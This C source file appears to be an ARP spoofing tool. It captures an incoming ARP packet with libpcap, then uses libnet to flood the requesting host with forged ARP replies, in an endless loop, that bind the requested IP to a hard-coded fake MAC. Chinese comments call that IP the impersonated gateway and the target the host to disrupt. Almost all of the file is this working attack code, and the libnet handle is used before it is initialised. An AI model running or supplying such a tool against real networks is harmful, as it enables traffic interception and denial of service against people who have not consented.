#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <libnet.h>

#define MAXBYTES2CAPTURE 2048
#define ARP_REQUEST 1
#define ARP_REPLY 2

typedef struct arphdr
{
    u_int16_t htype; //hardware type
    u_int16_t ptype; //protocol type
    u_char hlen;     //hardware address length
    u_char plen;     //protocol address length
    u_int16_t oper;  //operation code
    u_char sha[6];   //sendHardware address
    u_char spa[4];   //sender ip address
    u_char tha[6];   //target hardware address
    u_char tpa[4];   //target ip address
} ARPHEAD;

void callback(u_char *user, const struct pcap_pkthdr *header, const u_char *pkt_data);

int main(int argc, char **argv)
{
    pcap_t *enth;                  /* Session enth */
    char *dev;                     /* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE]; /* Error string */
    struct bpf_program fp;         /* The compiled filter */
    char filter_exp[] = "port 80"; /* The filter expression */
    bpf_u_int32 mask;              /* Our netmask */
    bpf_u_int32 net;               /* Our IP */
    struct pcap_pkthdr header;     /* The header that pcap gives us */
    const u_char *packet;          /* The actual packet */

    /* Define the device */
    dev = pcap_lookupdev(errbuf); //查看设备，返回句柄
    if (dev == NULL)
    { //如果返回空则报错
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        return (2);
    }
    /* Find the properties for the device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
    { //获取设备详细信息，如IP、掩码等等
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
    }
    /* Open the session in promiscuous mode */
    enth = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); //开始混杂模式监听
    if (enth == NULL)
    {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return (2);
    }

    /*complie the filter expression of filter program*/
    pcap_compile(enth, &fp, "arp", 0, mask);

    pcap_setfilter(enth, &fp);

    pcap_loop(enth, 1, callback, NULL); //开始循环补包

    /* And close the session */
    pcap_close(enth);
}

void callback(u_char *user, const struct pcap_pkthdr *header, const u_char *pkt_data)
{
    libnet_t *handle; /* Libnet句柄 */
    int packet_size;
    char *device = "ens33";                                     /* 设备名字,也支持点十进制的IP地址,会自己找到匹配的设备 */
    // u_int8_t *src_ip_str = "192.168.2.30";                      /* 冒充的网关IP */
    // u_int8_t *dst_ip_str = "192.168.2.170";                     /* 干扰的目标IP */
    u_int8_t src_ip_str[16];                      /* 冒充的网关IP */
    u_int8_t dst_ip_str[16];
    u_int8_t src_mac[6] = {0x00, 0x0c, 0x29, 0x73, 0xfa, 0x11}; /* 虚假的源MAC，改成我的也行 */
    u_int8_t dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c}; /* 干扰的目标MAC */
    u_int32_t dst_ip, src_ip;                                   /* 网路序的目的IP和源IP */
    char error[LIBNET_ERRBUF_SIZE];                             /* 出错信息 */
    libnet_ptag_t arp_proto_tag, eth_proto_tag;

    ARPHEAD *arpheader = (ARPHEAD *)(pkt_data + 14); /*Point to the ARP header*/
    printf("\n------------- ARP --------------\n");
    printf("Received Packet Size: %d bytes\n", header->len);
    printf("Hardware type: %s\n", (ntohs(arpheader->htype) == 1) ? "Ethernet" : "Unknown");
    printf("Protocol type: %s\n", (ntohs(arpheader->ptype) == 0x0800) ? "IPv4" : "Unknown");
    printf("Operation : %s\n", (ntohs(arpheader->oper) == ARP_REQUEST) ? "ARP_REQUEST" : "ARP_REPLY");

    /*If is Ethernet and IPv4 print packet contents*/
    if (ntohs(arpheader->htype) == 1 && ntohs(arpheader->ptype) == 0x0800)
    {
        printf("\nSoucre MAC:%02x:%02x:%02X:%02x:%02x:%02x\n",
               arpheader->sha[0], arpheader->sha[1],
               arpheader->sha[2], arpheader->sha[3],
               arpheader->sha[4], arpheader->sha[5]);
        printf("Soucre IP:%d.%d.%d.%d\n",
               arpheader->spa[0], arpheader->spa[1],
               arpheader->spa[2], arpheader->spa[3]);
        printf("\nDestination MAC:%02x:%02x:%02X:%02x:%02x:%02x\n",
               arpheader->tha[0], arpheader->tha[1],
               arpheader->tha[2], arpheader->tha[3],
               arpheader->tha[4], arpheader->tha[5]);
        printf("Destination IP:%d.%d.%d.%d\n",
               arpheader->tpa[0], arpheader->tpa[1],
               arpheader->tpa[2], arpheader->tpa[3]);

        sprintf(dst_ip_str, "%d.%d.%d.%d", arpheader->spa[0], arpheader->spa[1],
                arpheader->spa[2], arpheader->spa[3]);
        sprintf(src_ip_str, "%d.%d.%d.%d", arpheader->tpa[0], arpheader->tpa[1],
                arpheader->tpa[2], arpheader->tpa[3]);

        dst_ip = libnet_name2addr4(handle, dst_ip_str, LIBNET_RESOLVE);
        /* 把源IP地址字符串转化成网络序 */
        src_ip = libnet_name2addr4(handle, src_ip_str, LIBNET_RESOLVE);

        dst_mac[0] = arpheader->sha[0];
        dst_mac[1] = arpheader->sha[1];
        dst_mac[2] = arpheader->sha[2];
        dst_mac[3] = arpheader->sha[3];
        dst_mac[4] = arpheader->sha[4];
        dst_mac[5] = arpheader->sha[5];

        if (dst_ip == -1 || src_ip == -1)
        {
            printf("ip address convert error\n");
            exit(-1);
        };
        /* 初始化Libnet,注意第一个参数和TCP初始化不同 */
        if ((handle = libnet_init(LIBNET_LINK_ADV, device, error)) == NULL)
        {
            printf("libnet_init: error [%s]\n", error);
            exit(-2);
        };

        /* 构造arp协议块 */
        arp_proto_tag = libnet_build_arp(
            ARPHRD_ETHER,        /* 硬件类型,1表示以太网硬件地址 */
            ETHERTYPE_IP,        /* 0x0800表示询问IP地址 */
            6,                   /* 硬件地址长度 */
            4,                   /* IP地址长度 */
            ARPOP_REPLY,         /* 操作方式:ARP请求 */
            src_mac,             /* source MAC addr */
            (u_int8_t *)&src_ip, /* src proto addr */
            dst_mac,             /* dst MAC addr */
            (u_int8_t *)&dst_ip, /* dst IP addr */
            NULL,                /* no payload */
            0,                   /* payload length */
            handle,              /* libnet tag */
            0                    /* Create new one */
        );
        if (arp_proto_tag == -1)
        {
            printf("build IP failure\n");
            exit(-3);
        };

        /* 构造一个以太网协议块
        You should only use this function when 
        libnet is initialized with the LIBNET_LINK interface.*/
        eth_proto_tag = libnet_build_ethernet(
            dst_mac,       /* 以太网目的地址 */
            src_mac,       /* 以太网源地址 */
            ETHERTYPE_ARP, /* 以太网上层协议类型，此时为ARP请求 */
            NULL,          /* 负载，这里为空 */
            0,             /* 负载大小 */
            handle,        /* Libnet句柄 */
            0              /* 协议块标记，0表示构造一个新的 */
        );
        if (eth_proto_tag == -1)
        {
            printf("build eth_header failure\n");
            exit(-4);
        };

        while (1)
        {
            packet_size = libnet_write(handle); /* 死循环发送arp欺骗广播 */
            usleep(1000);
        };

        libnet_destroy(handle); /* 释放句柄 */
        exit(0);
    }
}
